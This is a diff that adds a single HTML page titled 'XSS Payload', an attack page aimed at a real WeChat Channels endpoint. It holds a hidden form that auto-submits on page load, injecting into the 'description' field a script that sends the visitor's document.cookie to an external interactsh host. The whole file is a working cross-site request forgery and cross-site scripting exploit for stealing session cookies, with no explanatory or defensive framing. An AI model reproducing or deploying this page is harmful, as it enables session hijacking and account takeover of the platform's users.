@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>XSS Payload</title>
+</head>
+<body>
+<form 
+    action="https://channels.weixin.qq.com/micro/content/cgi-bin/mmfinderassistant-bin/collection/search_collection?_aid=89f30832-04a8-4972-8efd-3d746690571b&_rid=6a07ddd5-cab87495&_pageUrl=https:%2F%2Fchannels.weixin.qq.com%2Fmicro%2Fcontent%2Fpost%2FfinderNewLifeCreate" 
+    method="post" 
+    id="xssForm"
+>
+    <!-- 关键：接口参数名是 description，不是 desc -->
+    <input 
+        type="hidden" 
+        name="description" 
+        value='<script>fetch("https://xxx.interactsh.com?c="+encodeURIComponent(document.cookie))</script>'
+    >
+</form>
+
+<script>
+    // 自动提交表单
+    document.getElementById("xssForm").submit();
+</script>
+</body>
+</html>
